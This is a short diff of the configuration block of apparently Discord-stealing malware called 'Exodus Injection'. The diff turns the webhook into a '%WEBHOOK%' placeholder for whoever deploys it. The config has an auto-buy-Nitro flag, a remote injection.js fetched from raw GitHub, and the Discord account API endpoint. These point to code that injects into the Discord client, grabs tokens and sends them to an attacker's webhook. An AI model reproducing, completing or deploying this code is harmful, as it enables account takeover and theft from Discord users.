@@ -10,12 +10,10 @@ const { exec } = require("child_process");
 
 const config = {
     auto_buy_nitro: false,
-    ping_on_run: false,
-    ping_val: "@here",
     embed_name: "Exodus Injection",
     embed_icon: "https://media.tenor.com/7NI3qoRF7BsAAAAC/anime-dance.gif",
     embed_color: 8363488,
-    webhook: "ewe",
+    webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/js/injection.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v10/users/@me",
